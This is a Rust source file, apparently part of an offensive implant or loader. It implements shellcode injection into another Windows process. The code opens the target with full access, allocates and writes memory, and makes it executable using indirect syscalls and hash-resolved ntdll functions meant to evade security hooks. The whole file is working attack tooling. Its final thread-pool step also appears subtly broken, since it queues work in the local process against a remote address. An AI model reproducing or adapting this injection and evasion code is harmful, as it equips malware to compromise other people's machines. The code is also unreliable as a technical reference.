#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE};

#[cfg(target_os = "windows")]
#[repr(C)]
struct TlObjectAttributes {
    length: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct TlClientId {
    unique_process: usize,
    unique_thread: usize,
}

#[cfg(target_os = "windows")]
pub unsafe fn inject_threadless(target_pid: u32, shellcode: &[u8]) -> bool {
    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
    use crate::evasion::syscalls::{get_ssn, indirect_syscall};

    let mut oa_tl: TlObjectAttributes = core::mem::zeroed();
    oa_tl.length = core::mem::size_of::<TlObjectAttributes>() as u32;
    let mut cid_tl: TlClientId = core::mem::zeroed();
    cid_tl.unique_process = target_pid as usize;
    let (ssn_open, tramp_open) = match get_ssn(b"NtOpenProcess") {
        Some(v) => v, None => return false,
    };
    let mut h_proc: isize = 0;
    let open_status = indirect_syscall(
        ssn_open, tramp_open,
        &mut h_proc as *mut isize as usize,
        0x001F_0FFF_usize,
        &oa_tl as *const TlObjectAttributes as usize,
        &cid_tl as *const TlClientId as usize,
        0, 0,
    );
    if open_status < 0 || h_proc == 0 { return false; }

    let nt_close = |h: isize| {
        if let Some((ssn_c, tramp_c)) = get_ssn(b"NtClose") {
            indirect_syscall(ssn_c, tramp_c, h as usize, 0, 0, 0, 0, 0);
        }
    };

    // NtAllocateVirtualMemory for cross-process shellcode region
    let (alloc_ssn, alloc_tramp) = match get_ssn(b"NtAllocateVirtualMemory") {
        Some(x) => x, None => { nt_close(h_proc); return false; }
    };
    let (prot_ssn, prot_tramp) = match get_ssn(b"NtProtectVirtualMemory") {
        Some(x) => x, None => { nt_close(h_proc); return false; }
    };
    let (wvm_ssn, wvm_tramp) = match get_ssn(b"NtWriteVirtualMemory") {
        Some(x) => x, None => { nt_close(h_proc); return false; }
    };

    let mut remote_base: usize = 0;
    let mut region_size: usize = shellcode.len();
    let alloc_status = indirect_syscall(
        alloc_ssn, alloc_tramp,
        h_proc as usize,
        &mut remote_base as *mut usize as usize,
        0, // ZeroBits
        &mut region_size as *mut usize as usize,
        (MEM_COMMIT | MEM_RESERVE) as usize,
        0x04, // PAGE_READWRITE
    );
    if alloc_status != 0 || remote_base == 0 { nt_close(h_proc); return false; }

    // Write shellcode into the remote region
    let mut written: usize = 0;
    indirect_syscall(
        wvm_ssn, wvm_tramp,
        h_proc as usize,
        remote_base,
        shellcode.as_ptr() as usize,
        shellcode.len(),
        &mut written as *mut usize as usize,
        0,
    );

    // Make region executable
    let mut rx_base = remote_base; let mut rx_sz = shellcode.len(); let mut old_p = 0u32;
    indirect_syscall(
        prot_ssn, prot_tramp,
        h_proc as usize,
        &mut rx_base as *mut usize as usize,
        &mut rx_sz   as *mut usize as usize,
        0x20, // PAGE_EXECUTE_READ
        &mut old_p as *mut u32 as usize,
        0,
    );

    // Resolve threadless injection stubs from ntdll via PEB + hash
    #[cfg(target_arch = "x86_64")]
    let ntdll = {
        const NTDLL_H: u32 = djb2_hash_lower(b"ntdll.dll");
        peb_get_module_base(NTDLL_H)
    };
    #[cfg(not(target_arch = "x86_64"))]
    let ntdll = {
        windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8
    };
    if ntdll.is_null() { nt_close(h_proc); return false; }

    let tp_alloc   = match resolve_by_hash(ntdll, djb2_hash(b"TpAllocWork"))   { Some(p) => p, None => { nt_close(h_proc); return false; } };
    let tp_post    = match resolve_by_hash(ntdll, djb2_hash(b"TpPostWork"))    { Some(p) => p, None => { nt_close(h_proc); return false; } };
    let tp_release = match resolve_by_hash(ntdll, djb2_hash(b"TpReleaseWork")) { Some(p) => p, None => { nt_close(h_proc); return false; } };

    type TpAllocWorkFn   = unsafe extern "system" fn(*mut usize, *mut core::ffi::c_void, *mut core::ffi::c_void, usize) -> i32;
    type TpPostWorkFn    = unsafe extern "system" fn(usize);
    type TpReleaseWorkFn = unsafe extern "system" fn(usize);

    let tp_alloc_fn:   TpAllocWorkFn   = core::mem::transmute(tp_alloc);
    let tp_post_fn:    TpPostWorkFn    = core::mem::transmute(tp_post);
    let tp_release_fn: TpReleaseWorkFn = core::mem::transmute(tp_release);

    let mut work_item: usize = 0;
    tp_alloc_fn(
        &mut work_item,
        core::mem::transmute(remote_base as *mut core::ffi::c_void),
        core::ptr::null_mut(),
        0,
    );

    tp_post_fn(work_item);
    let delay_100ns: i64 = -(500 * 10_000i64);
    if let Some((ssn_d, tramp_d)) = get_ssn(b"NtDelayExecution") {
        indirect_syscall(ssn_d, tramp_d, 0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0);
    }
    tp_release_fn(work_item);
    nt_close(h_proc);
    true
}
